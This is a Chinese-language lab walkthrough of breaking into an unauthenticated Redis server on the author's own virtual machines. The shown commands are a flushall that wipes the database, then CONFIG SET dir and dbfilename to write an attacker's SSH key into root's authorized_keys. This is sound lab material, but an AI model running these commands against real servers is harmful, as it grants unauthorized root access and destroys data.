#nmap扫描

```
root@kali:~/Desktop# nmap -sV -p6379 192.168.2.128
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-09 01:49 EST
Nmap scan report for 192.168.2.128
Host is up (0.00030s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
MAC Address: 00:0C:29:6D:62:2C (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

#空密码入侵

**kali 本地生成密钥文件**

```
root@kali:/tmp# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_rsa.
Your public key has been saved in /tmp/id_rsa.pub.
The key fingerprint is:
SHA256:SxRm2EaPTTrux9tivExvu8EAOrThPQV+Q4LNvFkRQXU root@kali
The key's randomart image is:
+---[RSA 2048]----+
|       OB.B=. E  |
|      o+*@.  .   |
|      o.B+*      |
|     o Bo= .     |
|      = S .      |
|       + + o     |
|        o.+ o    |
|         +++..   |
|         .++=o   |
+----[SHA256]-----+

```

登录redis，set一个值
```

root@kali:/tmp# cat id_rsa.pub | redis-cli -h 192.168.2.128 -x set redis
OK
root@kali:/tmp# redis-cli -h 192.168.2.128
192.168.2.128:6379> get redis
"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLNts8r8XR2B1X+U8T2P0mG5+p82tcpFjTkjUq0RECl2exx9VvRKShTZjdBNN8o0vEJx1BsINKPVaTvi0jwXEMx6ImQrpcAxfRqurniOOQLiOXyhRU38Sit1tC/E4z+rkzdRIPriSDtI0WZ6flCW/CowrlZHHGJCIswRhiwV5fJap0EPcBHlp1UpenhwZmwy3hCIkGinJOAfjaU5OqHurrS2cH7ROfosuZgHFOSBGL9ghGyY9iM8EIm6hINCsDKxrFz4XkiL8pKggm8TKcuMLXcYNjKFijpVWvj5YM5b1LdvgaKODYzrvXb7A7um6zE+2yqQdb3UIEYatER9RO6j/b root@kali\n"
192.168.2.128:6379> 

```
准备切换写入的目录的时候，提示权限不够
```
192.168.2.128:6379> CONFIG SET dir /root/.ssh/
(error) ERR Changing directory: Permission denied
192.168.2.128:6379> 

```

发现默认apt安装启动是以redis用户启动
```
root@l-virtual-machine:~# ps aux | grep redis
redis       778  0.0  0.0  58548  3852 ?        Ssl  1月08   0:48 /usr/bin/redis-server 0.0.0.0:6379
root       7069  0.0  0.0  21532  1076 pts/1    S+   15:04   0:00 grep --color=auto redis
```
换一种启动方式
```
root@l-virtual-machine:~# /usr/bin/redis-server 
7217:C 09 Jan 15:07:53.260 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
7217:C 09 Jan 15:07:53.260 # Redis version=4.0.9, bits=64, commit=00000000, modified=0, pid=7217, just started
7217:C 09 Jan 15:07:53.261 # Warning: no config file specified, using the default config. In order to specify a config file use /usr/bin/redis-server /path/to/redis.conf
7217:M 09 Jan 15:07:53.261 * Increased maximum number of open files to 10032 (it was originally set to 1024).
                _._                                                  
           _.-``__ ''-._                                             
      _.-``    `.  `_.  ''-._           Redis 4.0.9 (00000000/0) 64 bit
  .-`` .-```.  ```\/    _.,_ ''-._                                   
 (    '      ,       .-`  | `,    )     Running in standalone mode
 |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
 |    `-._   `._    /     _.-'    |     PID: 7217
  `-._    `-._  `-./  _.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |           http://redis.io        
  `-._    `-._`-.__.-'_.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |                                  
  `-._    `-._`-.__.-'_.-'    _.-'                                   
      `-._    `-.__.-'    _.-'                                       
          `-._        _.-'                                           
              `-.__.-'                                               

7217:M 09 Jan 15:07:53.264 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.
7217:M 09 Jan 15:07:53.265 # Server initialized
7217:M 09 Jan 15:07:53.265 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
7217:M 09 Jan 15:07:53.265 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.
7217:M 09 Jan 15:07:53.265 * Ready to accept connections


```
root用户启动了
```
root@l-virtual-machine:~# ps aux | grep redis
root       7217  0.0  0.0  58548  4180 pts/1    Sl+  15:07   0:00 /usr/bin/redis-server *:6379
root       7315  0.0  0.0  21532  1056 pts/2    S+   15:08   0:00 grep --color=auto redis
root@l-virtual-machine:~# 
```
发现还是会报错
```
192.168.2.128:6379> CONFIG SET dir /root/.ssh/
(error) DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command 'CONFIG SET protected-mode no' from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to 'no', and then restarting the server. 3) If you started the server manually just for testing, restart it with the '--protected-mode no' option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.

```

redis服务器停止保护模式
```
root@l-virtual-machine:~# redis-cli 
127.0.0.1:6379> CONFIG SET protected-mode no
OK
127.0.0.1:6379> 
```

如果一套流程下来的话，还是有问题的，可以看到已经写入成功
```
root@kali:/tmp# cat id_rsa.pub | redis-cli -h 192.168.2.128 -x set redis
OK
root@kali:/tmp# redis-cli -h 192.168.2.128
192.168.2.128:6379> CONFIG SET dir /root/.ssh/
OK
192.168.2.128:6379> CONFIG SET dbfilename "authorized_keys"
OK
192.168.2.128:6379> save
OK
192.168.2.128:6379> 
```
不过查看认证文件，会发现还有其他东西的
```
root@l-virtual-machine:~/.ssh# cat authorized_keys 
REDIS0008s-ver4.0.9is-bitsedisA?ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLNts8r8XR2B1X+U8T2P0mG5+p82tcpFjTkjUq0RECl2exx9VvRKShTZjdBNN8o0vEJx1BsINKPVaTvi0jwXEMx6ImQrpcAxfRqurniOOQLiOXyhRU38Sit1tC/E4z+rkzdRIPriSDtI0WZ6flCW/CowrlZHHGJCIswRhiwV5fJap0EPcBHlp1UpenhwZmwy3hCIkGinJOAfjaU5OqHurrS2cH7ROfosuZgHFOSBGL9ghGyY9iM8EIm6hINCsDKxrFz4XkiL8pKggm8TKcuMLXcYNjKFijpVWvj5YM5b1LdvgaKODYzrvXb7A7um6zE+2yqQdb3UIEYatER9RO6j/b 
```
所以需要在写入公钥之前，清空数据库
```
root@kali:/tmp# redis-cli -h 192.168.2.128 flushall
OK
root@kali:/tmp# cat id_rsa.pub | redis-cli -h 192.168.2.128 -x set redis
OK
root@kali:/tmp# redis-cli -h 192.168.2.128
192.168.2.128:6379> CONFIG SET dir /root/.ssh/
OK
192.168.2.128:6379> CONFIG SET dbfilename "authorized_keys"
OK
192.168.2.128:6379> save
OK
192.168.2.128:6379> exit

```


**失败的原因找到了，我一开始用ubuntu，不行，后来换了centos7就可以了**

